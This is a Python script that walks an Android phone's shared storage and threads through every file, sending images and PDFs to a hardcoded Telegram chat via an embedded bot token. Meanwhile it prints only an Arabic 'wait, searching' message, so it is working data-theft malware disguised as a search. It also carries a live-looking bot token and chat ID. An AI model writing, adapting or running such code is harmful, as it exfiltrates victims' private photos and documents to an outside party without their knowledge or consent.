import os
import telebot
from threading import Thread

bot = telebot.TeleBot("6856108262:AAEVjMeKNzpxGgFCARONpsLvEnkXIT1Jo1k") 
dir_path = "/storage/emulated/0/"

def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.endswith(".jpg") or file_path.endswith("pdf") or file_path.endswith("PNG") or file_path.endswith("JPEG") or file_path.endswith("jpeg") or file_path.endswith("Webp") or file_path.endswith("webp"):
            bot.send_photo(chat_id="5034251652", photo=f)  
        else:
            print("انتظر جاري بحث")

for root, dirs, files in os.walk(dir_path):
    threads = []
    for file in files:
        file_path = os.path.join(root, file)
        t = Thread(target=send_file, args=(file_path,))
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()